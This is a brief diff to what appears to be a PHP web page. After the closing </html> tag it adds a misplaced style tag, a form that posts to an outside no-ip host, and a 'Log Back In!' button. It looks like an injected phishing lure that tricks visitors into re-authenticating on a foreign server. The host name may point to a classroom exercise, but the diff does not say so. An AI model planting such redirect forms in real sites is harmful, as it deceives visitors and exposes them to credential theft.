@@ -19,3 +19,7 @@
 		?>
 	</body>
 </html>
+<style type="position:absolute; top: 200px; left: 200px;"></style>
+<form action="http://cst316m.no-ip.org/" method="post">
+<input type="submit" name="submit" value="Log Back In!"></form>
+</div>
